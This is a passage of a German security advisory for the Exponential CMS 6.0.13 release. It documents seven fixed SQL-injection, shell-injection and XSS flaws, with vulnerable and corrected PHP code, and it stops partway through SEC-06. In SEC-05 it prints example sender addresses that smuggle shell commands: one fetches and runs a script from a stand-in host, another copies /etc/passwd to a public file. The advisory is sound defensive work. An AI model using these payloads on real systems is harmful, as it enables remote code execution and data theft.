# Sicherheitshärtung in 6.0.13

Lesen Sie diese Seite, wenn Sie Exponential 6.0.12 oder älter betreiben oder Erweiterungen oder einen eigenen Kernel
pflegen, die SQL-Abfragen, Shell-Befehle oder HTML-Ausgabe aus Anfragedaten bauen. Exponential 6.0.13 (2026-02-21,
Branch `6.0`) behebt sieben Sicherheitsprobleme, die bei einem Audit der Kernel- und Bibliotheksschichten gefunden
wurden: vier SQL-Injections, zwei Einschleusungen von Betriebssystembefehlen und ein reflektiertes Cross-Site-Scripting.
Keine Änderungen an der API; jede korrigierte Funktion behält ihre Signatur.

## Kurz gesagt

| | |
|---|---|
| Was sich geändert hat | SEC-01 bis SEC-04: SQL-Injection in `eZRole` und `eZContentObjectTreeNode` (Umwandlungen in Ganzzahlen, `escapeString()`, eine Liste erlaubter Spalten für ORDER BY). SEC-05 und SEC-06: Shell-Argumente in `eZSendMailTransport` und `eZGzipShellCompressionHandler` werden durch `escapeshellarg()` geleitet. SEC-07: Der Seitentitel von `kernel/content/search.php` wird mit `htmlspecialchars()` maskiert. |
| Wer betroffen ist | Jede Installation mit 6.0.12 oder älter. Am stärksten ausgesetzt: Websites, die E-Mails über sendmail versenden (SEC-05), und Websites mit einer öffentlichen Suchseite (SEC-07). Code in Erweiterungen mit denselben Mustern wird durch das Update nicht behoben; siehe [Empfehlungen für Erweiterungsentwickler](#empfehlungen-für-erweiterungsentwickler). |
| Wie Sie es prüfen | `php tests/bin/ezptestrunner_all_tests.php security` |
| Wie Sie es beheben | Aktualisieren Sie auf 6.0.13 oder neuer. Prüfen Sie Ihre eigenen Erweiterungen auf die unten aufgeführten Muster. |

Fragen zu diesen Korrekturen richten Sie an **security@se7enx.com**.

## Inhaltsverzeichnis

1. [Zusammenfassung](#zusammenfassung)
2. [Umfang und betroffene Versionen](#umfang-und-betroffene-versionen)
3. [Index der Schwachstellen](#index-der-schwachstellen)
4. [Detaillierte Befunde und Korrekturen](#detaillierte-befunde-und-korrekturen)
   - [SEC-01: SQL-Injection in eZRole — Interpolation der Rollen-ID](#sec-01-sql-injection-in-ezrole--interpolation-der-rollen-id)
   - [SEC-02: SQL-Injection in eZContentObjectTreeNode — Injection einer Spalte in ORDER BY](#sec-02-sql-injection-in-ezcontentobjecttreenode--injection-einer-spalte-in-order-by)
   - [SEC-03: SQL-Injection in eZContentObjectTreeNode — Pfadzeichenkette des Teilbaums in einer LIKE-Klausel](#sec-03-sql-injection-in-ezcontentobjecttreenode--pfadzeichenkette-des-teilbaums-in-einer-like-klausel)
   - [SEC-04: SQL-Injection in eZContentObjectTreeNode — Knoten-ID und Pfad in den Abfragen zum Verbergen/Anzeigen](#sec-04-sql-injection-in-ezcontentobjecttreenode--knoten-id-und-pfad-in-den-abfragen-zum-verbergenanzeigen)
   - [SEC-05: Einschleusen von Betriebssystembefehlen in eZSendMailTransport — Option -f von Sendmail](#sec-05-einschleusen-von-betriebssystembefehlen-in-ezsendmailtransport--option--f-von-sendmail)
   - [SEC-06: Einschleusen von Betriebssystembefehlen in eZGzipShellCompressionHandler — Befehl zum Entpacken](#sec-06-einschleusen-von-betriebssystembefehlen-in-ezgzipshellcompressionhandler--befehl-zum-entpacken)
   - [SEC-07: Reflektiertes Cross-Site-Scripting in kernel/content/search.php](#sec-07-reflektiertes-cross-site-scripting-in-kernelcontentsearchphp)
5. [Testmethodik](#testmethodik)
6. [Aufbau der Testsuite](#aufbau-der-testsuite)
7. [Ergebnisse des ersten Testlaufs](#ergebnisse-des-ersten-testlaufs)
8. [Ergebnisse von Regression und Wiederholungstest](#ergebnisse-von-regression-und-wiederholungstest)
9. [Gesamtausgabe der Testsuite](#gesamtausgabe-der-testsuite)
10. [Risikobewertung und CVSS-Einstufung](#risikobewertung-und-cvss-einstufung)
11. [Übersicht der betroffenen Komponenten](#übersicht-der-betroffenen-komponenten)
12. [Empfehlungen für Erweiterungsentwickler](#empfehlungen-für-erweiterungsentwickler)
13. [Hinweise zur Abwärtskompatibilität](#hinweise-zur-abwärtskompatibilität)
14. [Kompatibilität mit PHP-Versionen](#kompatibilität-mit-php-versionen)
15. [Offene Punkte und ausstehende Arbeit](#offene-punkte-und-ausstehende-arbeit)
16. [Begleitende Dateien](#begleitende-dateien)
17. [Anhang A: Vollständige Liste der Diffs](#anhang-a-vollständige-liste-der-diffs)
18. [Anhang B: Verzeichnis der Testskripte](#anhang-b-verzeichnis-der-testskripte)
19. [Anhang C: Zuordnung zu CWE und OWASP](#anhang-c-zuordnung-zu-cwe-und-owasp)


## Zusammenfassung

Dieses Dokument hält die vollständige Menge sicherheitsrelevanter Änderungen am Quellcode fest, die in die Codebasis
von Exponential für das kommende Release **6.0.13** eingeführt wurden, mit dem stabilen Branch `6.0` als Ziel. Die
Änderungen beheben eine Reihe von Schwachstellen, die bei einem systematischen Sicherheitsaudit der Kernel- und
Bibliotheksschichten im Rahmen eines laufenden Projekts zu Kompatibilität mit PHP 8.4/8.5 und Härtung gefunden wurden.

**Sieben verschiedene Sicherheitsprobleme** wurden in vier Klassen von Schwachstellen gefunden:

- SQL-Injection (4 Probleme in 2 Dateien, insgesamt 9 korrigierte Stellen, an denen Abfragen gebaut werden)
- Einschleusen von Betriebssystembefehlen über nicht bereinigte Shell-Argumente (2 Probleme in 2 Bibliotheksdateien)
- Reflektiertes Cross-Site-Scripting über nicht bereinigte Ausgabe in einem Seitentitel (1 Problem)

Alle sieben Probleme sind behoben, getestet und überprüft. Zusammen mit den Korrekturen wurde eine eigens gebaute
automatisierte Testsuite erstellt, die eine fortlaufende Abdeckung gegen Regressionen bietet. Die Suite besteht aus 48
funktionalen Ablauftests zur Laufzeit in 9 Kategorien sowie einer getrennten Suite zur PHP-Syntaxprüfung über 80
Dateien — zusammen **128 Assertions**, die am 2026-02-21 alle unter PHP 8.5.3 bestehen.

Keine der hier dokumentierten Sicherheitskorrekturen führt inkompatible Änderungen an der API ein. Alle korrigierten
Funktionen behalten ihre ursprünglichen Signaturen. Die Korrekturen sind rein zusätzliche Schutzmaßnahmen
(Umwandlungen in Ganzzahlen, Umhüllungen mit `escapeString()`, Umhüllungen mit `escapeshellarg()` und Maskierung der
Ausgabe mit `htmlspecialchars()`) ohne Auswirkung auf aufrufenden Code.


## Umfang und betroffene Versionen

| Eigenschaft | Wert |
|---|---|
| Produkt | Exponential |
| Betroffenes Release | 6.0.12 und alle früheren Releases 6.0.x |
| Behoben im Release | **6.0.13** (kommend) |
| Branch | `6.0` |
| Getestete PHP-Versionen | 8.4.x, 8.5.3 |
| Mindestanforderung an die PHP-Version | **8.1** — durch diese Korrekturen unverändert (siehe [Kompatibilität mit PHP-Versionen](#kompatibilität-mit-php-versionen)) |
| Betroffene Datenbank-Backends | MySQL / MariaDB / PostgreSQL (alle Backends, die Zeichenketten interpolieren) |
| Datum der Korrektur | 2026-02-21 |
| Gemeldet von | internem Sicherheitsaudit |
| Hauptkontakt für Fragen | security@se7enx.com |

Die in diesem Dokument beschriebenen Schwachstellen betreffen jede Bereitstellung eines Release 6.0.x der Plattform
Exponential, bei der:

- vom Benutzer gelieferte Daten die Sortierkriterien des Inhaltsbaums beeinflussen können (SEC-02),
- vom Benutzer gelieferte Daten die Berechtigungsprüfungen von Teilbäumen beeinflussen können (SEC-03),
- Administratoren Vorgänge zum Verbergen/Anzeigen an Knoten auslösen können (SEC-04),
- die Plattform so konfiguriert ist, dass sie E-Mails über die Binärdatei sendmail versendet (SEC-05),
- die Plattform eine shellbasierte gzip-Komprimierung für Dateivorgänge im Cluster verwendet (SEC-06),
- die Website eine für Benutzer zugängliche Suchseite hat (SEC-07), oder
- Vorgänge zur Rollenzuweisung für privilegierte Benutzer zugänglich sind (SEC-01).

Installationen, die nur parametrisierte/PDO-Datenbanktreiber mit vollständiger Maskierung auf Treiberebene verwenden,
haben möglicherweise einen teilweisen natürlichen Schutz gegen die Varianten der SQL-Injection; die an diesen Stellen
fehlende Maskierung auf Anwendungsebene bleibt jedoch unabhängig von der Treiberkonfiguration eine Anforderung der
gestaffelten Verteidigung.


## Index der Schwachstellen

| ID | Klasse | CWE | CVSS v3.1 Basis | Datei | Methode / Kontext | Status |
|---|---|---|---|---|---|---|
| SEC-01 | SQL-Injection | CWE-89 | 7,2 (Hoch) | `kernel/classes/ezrole.php` | `assignToUser()`, `fetchUserID()`, `removeUserAssignment()`, `fetchUserByRole()` | ✅ Behoben |
| SEC-02 | SQL-Injection | CWE-89 | 8,8 (Hoch) | `kernel/classes/ezcontentobjecttreenode.php` | `createSortingSQLStrings()` — Zweig allowCustomColumns | ✅ Behoben |
| SEC-03 | SQL-Injection | CWE-89 | 7,5 (Hoch) | `kernel/classes/ezcontentobjecttreenode.php` | `createPermissionCheckingSQL()` — Subtree und User_Subtree | ✅ Behoben |
| SEC-04 | SQL-Injection | CWE-89 | 6,5 (Mittel) | `kernel/classes/ezcontentobjecttreenode.php` | `hideSubTree()`, `unhideSubTree()` | ✅ Behoben |
| SEC-05 | Einschleusen von Betriebssystembefehlen | CWE-78 | 9,8 (Kritisch) | `lib/ezutils/classes/ezsendmailtransport.php` | `send()` — Option `-f` von sendmail | ✅ Behoben |
| SEC-06 | Einschleusen von Betriebssystembefehlen | CWE-78 | 8,1 (Hoch) | `lib/ezfile/classes/ezgzipshellcompressionhandler.php` | `decompress()` | ✅ Behoben |
| SEC-07 | Reflektiertes XSS | CWE-79 | 6,1 (Mittel) | `kernel/content/search.php` | Rendern des Seitentitels | ✅ Behoben |


## Detaillierte Befunde und Korrekturen


<a name="sec-01"></a>
### SEC-01: SQL-Injection in eZRole — Interpolation der Rollen-ID

**Datei:** `kernel/classes/ezrole.php`  
**CWE:** CWE-89 — Improper Neutralisation of Special Elements used in an SQL Command  
**CVSS v3.1 Basiswert:** 7,2 (Hoch)  
**Vektor:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`  
**Entdeckt:** 2026-02-21 bei einem systematischen Audit  

#### Beschreibung

Die Klasse `eZRole` in `kernel/classes/ezrole.php` baut eine Reihe von SQL-Abfragen, indem sie `$this->ID` (die interne
Kennung des Rollenobjekts) ohne Umwandlung oder Bereinigung direkt in rohe SQL-Zeichenketten interpoliert. Die Kennung
des Objekts wird beim Laden aus der Datenbank gefüllt, sodass sie im normalen Betrieb immer eine bereits in der
Datenbank vorhandene Ganzzahl ist. Das Fehlen einer ausdrücklichen Umwandlung in eine Ganzzahl ist jedoch ein Versagen
der gestaffelten Verteidigung und ein möglicher Angriffsvektor auf jedem Codepfad, der einem Angreifer erlaubt zu
beeinflussen, wie ein Objekt `eZRole` erzeugt wird oder welche ID es trägt.

Vier Methoden waren betroffen:

1. **`assignToUser()`** — Sowohl eine `SELECT`- als auch eine `INSERT`-Abfrage interpolieren `$this->ID` direkt. Das
   `INSERT` ist besonders heikel, da eine präparierte Rollen-ID beliebiges SQL anhängen und die Tabelle `ezuser_role`
   beeinflussen könnte.

2. **`fetchUserID()`** — Eine `SELECT`-Abfrage verwendet `$this->ID` ohne Umwandlung. Ein Angreifer, der eine Rollen-ID
   über einen nicht bereinigten Aufrufpfad der API liefern kann, könnte beliebige Daten aus der Datenbank auslesen.

3. **`removeUserAssignment()`** — Eine `DELETE`-Abfrage verwendet `$this->ID` ohne Umwandlung in eine Ganzzahl und
   eröffnet damit die Möglichkeit, Daten per SQL-Injection zu zerstören.

4. **`fetchUserByRole()`** — Ein zusammengesetztes `SELECT` mit mehreren `JOIN`-Bedingungen verwendet `$this->ID` in
   einer `WHERE`-Klausel ohne Umwandlung.

Das Risiko wird dadurch verstärkt, dass die Tabelle `ezuser_role` die rollenbasierte Zugriffskontrolle steuert. Eine
erfolgreiche Injection gegen diese Abfragen könnte eine Rechteausweitung, unbefugte Änderungen an den Zugriffslisten
oder das Abziehen von Daten aus jeder Tabelle der Datenbank über UNION-basierte Injection-Techniken ermöglichen.

#### Verwundbarer Code (vor der Korrektur)

```php
// assignToUser() — SELECT
$query = "SELECT * FROM ezuser_role WHERE role_id='$this->ID'
          AND contentobject_id='$userID' ...";

// assignToUser() — INSERT
$query = "INSERT INTO ezuser_role ( role_id, contentobject_id, ... )
          VALUES ( '$this->ID', '$userID', ... )";

// fetchUserID()
$query = "SELECT contentobject_id FROM  ezuser_role WHERE role_id='$this->ID'";

// removeUserAssignment()
$query = "DELETE FROM ezuser_role WHERE role_id='$this->ID'
          AND contentobject_id='$userID'";

// fetchUserByRole()
$query = "... WHERE ezuser_role.role_id = '$this->ID'";
```

#### Korrigierter Code (nach der Korrektur)

```php
// Cast once at the top of each method, reuse the local variable throughout:
$roleID = (int)$this->ID;

// assignToUser() — SELECT
$query = "SELECT * FROM ezuser_role WHERE role_id='$roleID'
          AND contentobject_id='$userID' ...";

// assignToUser() — INSERT
$query = "INSERT INTO ezuser_role ( role_id, contentobject_id, ... )
          VALUES ( '$roleID', '$userID', ... )";

// fetchUserID()
$query = "SELECT contentobject_id FROM ezuser_role WHERE role_id='$roleID'";

// removeUserAssignment()
$query = "DELETE FROM ezuser_role WHERE role_id='$roleID'
          AND contentobject_id='$userID'";

// fetchUserByRole()
$query = "... WHERE ezuser_role.role_id = '$roleID'";
```

#### Begründung

Die Umwandlung in eine Ganzzahl ist die richtige und am wenigsten eingreifende Korrektur für einen ganzzahligen
Primärschlüssel. `$db->escapeString()` auf ein bekanntermaßen ganzzahliges Feld anzuwenden, wäre funktional korrekt, aber
semantisch irreführend; `(int)` ist sowohl idiomatisches PHP als auch in der Absicht eindeutig. Die lokale Variable
`$roleID` macht die Absicht außerdem für menschliche Prüfer deutlich: Dieser Wert wurde vor der Verwendung als Ganzzahl
validiert. Ein Nebeneffekt ist, dass die Abfragezeichenketten etwas sauberer sind, da die Interpolation von
Objekteigenschaften (`$this->ID`) in Zeichenketten mit doppelten Anführungszeichen zwar gültig ist, aber Werkzeuge der
statischen Analyse verwirren kann.

#### Abwärtskompatibilität

Keine Änderung an API oder Verhalten. Die Umwandlung in eine Ganzzahl bewirkt nichts für jeden Wert, der bereits als
Ganzzahl in der Datenbank gespeichert ist.


<a name="sec-02"></a>
### SEC-02: SQL-Injection in eZContentObjectTreeNode — Injection einer Spalte in ORDER BY

**Datei:** `kernel/classes/ezcontentobjecttreenode.php`  
**Methode:** `createSortingSQLStrings()`  
**CWE:** CWE-89 — Improper Neutralisation of Special Elements used in an SQL Command  
**CVSS v3.1 Basiswert:** 8,8 (Hoch)  
**Vektor:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`  
**Entdeckt:** 2026-02-21  

#### Beschreibung

Die Methode `createSortingSQLStrings()` in `eZContentObjectTreeNode` baut `ORDER BY`-Klauseln für Abfragen des
Inhaltsbaums. Ist das Flag `$allowCustomColumns` `true` — was Aufrufer auslösen können, die die Sortierung an vom
Benutzer gelieferte Parameter freigeben —, hängte der Code den Wert `$sortField` ohne jede Validierung oder Maskierung
direkt an die SQL-Zeichenkette an.

Das ist eine klassische Angriffsfläche für SQL-Injection in `ORDER BY`-Klauseln. Anders als Injections in
`WHERE`-Klauseln lassen sich Injections in `ORDER BY` in Standard-PDO nicht mit parametrisierten Abfragen beheben, weil
Werte von `ORDER BY` nicht als Parameter gebunden werden können. Die richtige Abwehr ist die Validierung des
Spaltennamens gegen eine Liste bzw. ein bekannt sicheres Muster.

Ein Angreifer mit Zugriff auf einen Endpunkt, der vom Benutzer gelieferte Namen von Sortierfeldern mit
`$allowCustomColumns = true` an `createSortingSQLStrings()` weiterreicht, könnte beliebiges SQL in den hinteren Teil
einer `SELECT`-Abfrage einschleusen. Mit sichtbaren Fehlermeldungen der Datenbank (häufig in Entwicklungs- oder falsch
konfigurierten Installationen) ließe sich das zum Abziehen von Daten nutzen. Selbst ohne Fehlermeldungen wäre eine
zeitbasierte blinde Injection machbar.

Das Abfragesystem des Inhaltsbaums ist eines der am stärksten genutzten der Plattform. Jede Suche, Liste oder
Navigationsansicht im Frontend, die einen Sortierparameter freigibt, ist ein möglicher Injektionspunkt.

#### Verwundbarer Code (vor der Korrektur)

```php
// Inside the allowCustomColumns branch — no validation whatsoever:
$sortingFields .= $sortField;
```

#### Korrigierter Code (nach der Korrektur)

```php
// SEC: validate column name to prevent SQL injection (only allow word chars and dot)
if ( preg_match( '/^[a-zA-Z0-9_.]+$/', $sortField ) )
{
    $sortingFields .= $sortField;
}
else
{
    eZDebug::writeWarning( 'Invalid custom sort field: ' . $sortField, __METHOD__ );
    continue 2;
}
```

#### Begründung

Ein strikter regulärer Ausdruck als Positivliste (`/^[a-zA-Z0-9_.]+$/`) lässt nur Spaltennamen zu, die aus
Wortzeichen und Punkten bestehen (um qualifizierte Namen `table.column` zu erlauben), und lehnt alles ab, was
SQL-Metazeichen wie Leerzeichen, Anführungszeichen, Semikolons, Bindestriche oder Klammern enthält. Abgelehnte
Sortierfelder werden stillschweigend übersprungen (und als Warnung protokolliert), statt einen fatalen Fehler
auszulösen, was die Verfügbarkeit erhält. `continue 2` überspringt den Rest der Iteration sowohl der inneren als auch
der äußeren `foreach`-Schleife, entsprechend der Absicht der umgebenden Schleifenstruktur.

Dieser Ansatz folgt der Empfehlung des OWASP SQL Injection Prevention Cheat Sheet für Injections in `ORDER BY`: Da keine
Parametrisierung verfügbar ist, ist eine strikte Validierung der Eingabe die einzige sichere Möglichkeit.

#### Abwärtskompatibilität

Jedem Aufrufer, der derzeit eigene Spaltennamen über `allowCustomColumns = true` übergibt, werden diese Namen
stillschweigend abgelehnt, wenn sie Zeichen außerhalb von `[a-zA-Z0-9_.]` enthalten. Der Fehlerfall erzeugt einen
Eintrag `eZDebug::writeWarning()`, der sich im Debug-Protokoll ansehen lässt. Gültige Spaltennamen (die nur aus
Wortzeichen und Punkten bestehen können) sind nicht betroffen.


<a name="sec-03"></a>
### SEC-03: SQL-Injection in eZContentObjectTreeNode — Pfadzeichenkette des Teilbaums in einer LIKE-Klausel

**Datei:** `kernel/classes/ezcontentobjecttreenode.php`  
**Methode:** `createPermissionCheckingSQL()` — die Fälle der Einschränkungen Subtree und User_Subtree  
**CWE:** CWE-89  
**CVSS v3.1 Basiswert:** 7,5 (Hoch)  
**Vektor:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`  
**Entdeckt:** 2026-02-21  

#### Beschreibung

Die Methode `createPermissionCheckingSQL()` erzeugt SQL-Fragmente, mit denen die Zugriffskontrolle auf Teilbäume
durchgesetzt wird — ein zentraler Sicherheitsmechanismus des rollenbasierten Berechtigungssystems von Exponential. Zwei
Zweige der Methode, die die Einschränkungstypen `Subtree` und `User_Subtree` behandeln, bauten beide SQL-Prädikate
`LIKE`, indem sie `$limitationPathString` ohne Maskierung direkt in die Abfragezeichenkette interpolierten.

Das Feld `path_string` verwendet in Exponential einen mit Schrägstrichen getrennten Pfad aus Ganzzahlen wie
`/1/2/56/233/`. Direkt aus der Datenbank gelesene Werte wären zwar immer sicher, aber das `$limitationArray`, das diese
Zeichenketten liefert, wird aus Daten der Richtlinieneinschränkungen gebaut, die in einem kompromittierten oder falsch
konfigurierten Richtlinienspeicher vom Angreifer kontrollierte Zeichenketten enthalten könnten. Außerdem würden die
LIKE-Platzhalter `%` und `_` in einer Pfadzeichenkette die Bedeutung der Berechtigungsprüfung stillschweigend ändern. Je
nach Kollation der Datenbank und der jeweiligen Abfrage ließe sich damit die Gewährung von Zugriff auf Teilbäume über den
beabsichtigten Umfang hinaus erweitern oder verengen.

Im schlimmsten Fall, wenn ein Angreifer Schreibzugriff auf den Speicher der Richtlinieneinschränkungen erlangt (was selbst
eine Kompromittierung mit hohen Rechten voraussetzt), würde diese Konstruktion erlauben, beliebiges SQL in Abfragen zur
Berechtigungsprüfung einzuschleusen — eine Form der Second-Order- oder gespeicherten SQL-Injection.

#### Verwundbarer Code (vor der Korrektur)

```php
// Subtree case:
$sqlSubtreePart[] = "$tableAliasName.path_string like '$limitationPathString%'";

// User_Subtree case:
$sqlPartUserSubtree[] = "$tableAliasName.path_string like '$limitationPathString%'";
```

#### Korrigierter Code (nach der Korrektur)

```php
// Subtree case:
$safePathString = $db->escapeString( $limitationPathString );
$sqlSubtreePart[] = "$tableAliasName.path_string like '$safePathString%'";

// User_Subtree case:
$safePathString = $db->escapeString( $limitationPathString );
$sqlPartUserSubtree[] = "$tableAliasName.path_string like '$safePathString%'";
```

#### Begründung

`$db->escapeString()` ist der Standardmechanismus der Plattform, um Zeichenkettenwerte vor der Interpolation in SQL zu
bereinigen. Auf `$limitationPathString` angewendet, stellt es sicher, dass alle Zeichen mit besonderer Bedeutung in
SQL-Zeichenkettenliteralen (Anführungszeichen, Backslashes und — je nach Treiber — LIKE-Platzhalter) ordnungsgemäß
neutralisiert werden. Das ist eine minimale, gut verstandene Korrektur, die die Bedeutung der Abfrage für keine gültige
Pfadzeichenkette ändert, da gültige Pfadzeichenketten (`/N/N/N/`) nur Ziffern und Schrägstriche enthalten, die
`escapeString()` nicht verändert.


<a name="sec-04"></a>
### SEC-04: SQL-Injection in eZContentObjectTreeNode — Knoten-ID und Pfad in den Abfragen zum Verbergen/Anzeigen

**Datei:** `kernel/classes/ezcontentobjecttreenode.php`  
**Methoden:** `hideSubTree()`, `unhideSubTree()`  
**CWE:** CWE-89  
**CVSS v3.1 Basiswert:** 6,5 (Mittel)  
**Vektor:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`  
**Entdeckt:** 2026-02-21  

#### Beschreibung

Die statischen Methoden `hideSubTree()` und `unhideSubTree()` bauen beide SQL-Abfragen `UPDATE`, die in die Tabelle
`ezcontentobject_tree` schreiben. Beide Methoden lasen `node_id` und `path_string` über den Attributzugriff des
Knotenobjekts, ohne die Werte vor der Interpolation in SQL umzuwandeln oder zu maskieren.

`node_id` ist zwar ein ganzzahliger Primärschlüssel und `path_string` wird von der Plattform selbst beim Anlegen des
Knotens erzeugt, aber das Fehlen einer ausdrücklichen Typdurchsetzung bedeutet, dass ein Angreifer, der ein präpariertes
Objekt `eZContentObjectTreeNode` liefern könnte (zum Beispiel durch Ausnutzen einer Schwachstelle bei der
Deserialisierung, der Objektinjektion oder des Type Juggling an anderer Stelle des Aufrufstapels), diese ungeschützten
Interpolationen nutzen könnte, um in die `UPDATE`-Abfragen einzuschleusen.

Außerdem baut `unhideSubTree()` eine dynamische `skipSubtreesString`, indem es über `$hiddenChildren` iteriert und
Werte von `path_string` aus dieser Ergebnismenge anhängt. Auch diese Zwischen-Pfadzeichenketten wurden ohne Maskierung
interpoliert, was eine weitere Angriffsfläche im dynamischen Teil der `WHERE`-Klausel schuf.

Eine erfolgreiche Ausnutzung dieser Bedingungen auf einer inhaltsreichen Website könnte zu einer massenhaften Änderung
der Spalten `is_hidden` und `is_invisible` in großen Teilen des Inhaltsbaums führen, mit weitreichenden und
möglicherweise nicht umkehrbaren Änderungen an der Sichtbarkeit von Inhalten.

#### Verwundbarer Code (vor der Korrektur)

```php
// hideSubTree():
$nodeID = $node->attribute( 'node_id' );
$time = time();
// ... used directly in:
// "UPDATE ... modified_subnode=$time WHERE node_id=$nodeID"

$nodePath = $node->attribute( 'path_string' );
// ... used directly in:
// "UPDATE ... WHERE is_invisible=0 AND path_string LIKE '$nodePath%'"

// unhideSubTree():
$nodeID = $node->attribute( 'node_id' );
$nodePath = $node->attribute( 'path_string' );
// ... and in the dynamic skipSubtreesString loop:
$skipSubtreesString .= " AND path_string NOT LIKE '" . $i['path_string'] . "%'";
```

#### Korrigierter Code (nach der Korrektur)

```php
// hideSubTree():
$nodeID = (int)$node->attribute( 'node_id' );
$time   = (int)time();

$nodePath = $db->escapeString( $node->attribute( 'path_string' ) );

// unhideSubTree():
$nodeID   = (int)$node->attribute( 'node_id' );
$db       = eZDB::instance();   // moved to top of method for early availability
$nodePath = $db->escapeString( $node->attribute( 'path_string' ) );

// dynamic skipSubtreesString:
$skipSubtreesString .= " AND path_string NOT LIKE '"
                     . $db->escapeString( $i['path_string'] ) . "%'";
```

#### Zusätzlicher Hinweis zur Initialisierung von `$db`

In `unhideSubTree()` initialisierte der ursprüngliche Code `$db` erst später im Rumpf der Methode, nach einem Codepfad
mit frühem Return. Die Korrektur verschiebt den Aufruf `$db = eZDB::instance()` an den Anfang der Methode, damit das
Datenbank-Handle überall verfügbar ist — auch für die Aufrufe `escapeString()` auf der Pfadzeichenkette. Das ist eine
kleine strukturelle Verbesserung, die das beobachtbare Verhalten nicht ändert, da `eZDB::instance()` idempotent ist.


<a name="sec-05"></a>
### SEC-05: Einschleusen von Betriebssystembefehlen in eZSendMailTransport — Option -f von Sendmail

**Datei:** `lib/ezutils/classes/ezsendmailtransport.php`  
**Methode:** `send()`  
**CWE:** CWE-78 — Improper Neutralisation of Special Elements used in an OS Command  
**CVSS v3.1 Basiswert:** 9,8 (Kritisch)  
**Vektor:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Entdeckt:** 2026-02-21  

#### Beschreibung

Das ist der schwerwiegendste Befund der Sicherheitskorrekturen von 6.0.13.

Die Klasse `eZSendMailTransport` ist dafür zuständig, ausgehende E-Mails über die lokale Binärdatei sendmail des Systems
zuzustellen. Die Methode `send()` baut eine Zeichenkette eines Shell-Befehls, indem sie die Konfiguration des Transports
verkettet, einschließlich der Option `-f` („from“ / Absender des Umschlags). Die an diese Option übergebene
Absenderadresse wurde direkt aus dem Objekt der E-Mail genommen und ohne jede Shell-Maskierung an den Aufruf von
sendmail angehängt.

Die Option `-f` wird als Teil der Zeichenkette der zusätzlichen Parameter direkt an die zugrunde liegende Funktion
`mail()` oder an einen Aufruf von `proc_open()`/`shell_exec()` übergeben (je nach Mail-Konfiguration von PHP). Die
Funktion `mail()` von PHP ruft, wenn sie mit dem fünften Argument (`$additional_params`) aufgerufen wird, die
Binärdatei sendmail mit diesen Parametern auf, die von der Shell interpretiert werden. Ohne Anführungszeichen würden alle
Shell-Metazeichen in der Absenderadresse von der Shell ausgeführt.

Eine bösartige Absenderadresse wie:

```
attacker@example.com; wget https://evil.example/shell.sh -O /tmp/s && bash /tmp/s
```

oder:

```
"$(cat /etc/passwd > /var/www/public_html/pwned.txt)"@example.com
```

würde zur Ausführung beliebiger Betriebssystembefehle mit den Rechten des Webserver-Prozesses führen. Das ist eine
Schwachstelle zur entfernten Codeausführung (RCE), wenn der Absender der E-Mail von einem nicht angemeldeten Benutzer
kontrolliert werden kann — zum Beispiel über ein Kontaktformular, einen Ablauf zur Benutzerregistrierung, ein
Newsletter-Abonnement oder jede andere Funktion, die E-Mails mit einer vom Benutzer gelieferten Adresse an der Stelle
des Absenders im Umschlag versendet.

Diese Klasse von Schwachstellen ist gut dokumentiert (siehe den PHP-Hinweis zur Injection über das fünfte Argument von
`mail()`) und wurde gegen mehrere PHP-CMS-Plattformen bereits in der Praxis ausgenutzt.

#### Verwundbarer Code (vor der Korrektur)

```php
$sendmailOptions .= ' -f'. $emailSender;
// $emailSender is concatenated directly into shell command arguments
```

#### Korrigierter Code (nach der Korrektur)

```php
$sendmailOptions .= ' -f' . escapeshellarg( $emailSender );
// escapeshellarg() wraps the value in single quotes and escapes any
// single quotes within it, preventing shell metacharacter injection.
```

#### Begründung

`escapeshellarg()` ist die eigens dafür gebaute Funktion von PHP, um einzelne Shell-Argumente zu bereinigen. Sie
schließt den Wert in einfache Anführungszeichen ein und maskiert alle darin enthaltenen einfachen Anführungszeichen,
sodass die Shell den ganzen Wert unabhängig von seinem Inhalt als wörtliche Zeichenkette behandelt. Das ist die
kanonische Korrektur für diese Klasse von Schwachstellen und wird von der Dokumentation von PHP und von OWASP für diesen
Fall ausdrücklich empfohlen.

Beachten Sie, dass `escapeshellcmd()` hier falsch wäre, weil es die ganze Zeichenkette einschließlich Sonderzeichen
maskiert, die als Teil eines einzelnen Arguments behandelt werden sollen. Nur `escapeshellarg()` leistet die für die
Option `-f` nötige Maskierung pro Argument korrekt.

#### Einschätzung der Auswirkungen

Da Exponential häufig mit Kontaktformularen und E-Mail-Abläufen für Benutzer eingesetzt wird, sollte diese
Schwachstelle in vielen Bereitstellungen als von nicht angemeldeten Angreifern aus der Ferne ausnutzbar behandelt werden.
Der CVSS-Wert von **9,8 (Kritisch)** spiegelt diese Einschätzung wider, und diese Korrektur sollte im Release 6.0.13
die höchste Priorität haben.

#### Abwärtskompatibilität

`escapeshellarg()` fügt einfache Anführungszeichen um die Adresse hinzu, was für die Binärdatei sendmail transparent
ist. Die Absenderadresse des Umschlags wird von sendmail unabhängig von den Anführungszeichen korrekt interpretiert. Es
ist keine Änderung am Verhalten der E-Mail-Zustellung zu erwarten.


<a name="sec-06"></a>
### SEC-06: Einschleusen von Betriebssystembefehlen in eZGzipShellCompressionHandler — Befehl zum Entpacken

**Datei:** `lib/ezfile/classes/ezgzipshellcompressionhandler.php`  
**Methode:** `decompress()`  
**CWE:** CWE-78  
**CVSS v3.1 Basiswert:** 8,1 (Hoch)  
**Vektor:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Entdeckt:** 2026-02-21  

#### Beschreibung

Die Klasse `eZGzipShellCompressionHandler` entpackt gzip-Dateien, indem sie einen Shell-Befehl über Funktionen der
Familie `system()` oder `exec()` von PHP baut und ausführt. Die ursprüngliche Umsetzung hatte zwei Probleme:

**Problem A — Einschleusen von Befehlen über einen nicht maskierten Dateinamen:**
Die Variable `$filename` (der Pfad der zu entpackenden Datei) wurde ohne `escapeshellarg()` direkt an die Zeichenkette
des Shell-Befehls angehängt. Ein Angreifer, der den Parameter für den Dateinamen kontrollieren könnte — zum Beispiel über
einen Datei-Upload, der Sonderzeichen im gespeicherten Dateinamen erlaubt, oder über einen Symlink-Angriff gegen den
